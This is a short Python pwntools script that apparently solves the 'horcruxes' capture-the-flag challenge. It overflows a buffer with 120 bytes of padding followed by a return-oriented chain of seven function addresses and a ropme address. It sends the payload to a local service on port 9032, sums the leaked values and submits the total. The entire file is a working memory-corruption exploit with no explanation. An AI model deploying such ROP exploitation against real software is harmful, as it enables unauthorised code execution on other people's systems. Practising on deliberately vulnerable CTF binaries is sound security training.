from pwn import * 



def main():
        offset = 120
        num_horcruxes = 7
        exp_sum = 0


        A_address = p32(0x809fe4b) 
        B_address = p32(0x809fe6a)
        C_address = p32(0x809fe89)
        D_address = p32(0x809fea8)
        E_address = p32(0x809fec7)
        F_address = p32(0x809fee6)
        G_address = p32(0x809ff05)
        ROPME_address = p32(0x809fffc)

        payload = b"A" * offset + A_address + B_address + C_address + D_address + E_address +  F_address + G_address + ROPME_address
        p =  remote("0", 9032)#process(executable='./horcruxes', argv=["horcruxes"])
        print p.recv()
        print p.recv()
        p.sendline("1")
        p.sendline(payload)
        print p.recvline()
        for i in range(num_horcruxes):
                s = str(p.recvline())
                print s 
                exp = int(s[s.find("+") + 1: s.find(")")])
                print (exp)
                exp_sum += exp
        print p.recv()
        print str(exp_sum)
        p.sendline("1")
        print p.recv()
        p.sendline(str(exp_sum))
        print p.recv()

if __name__ == "__main__":
    main()
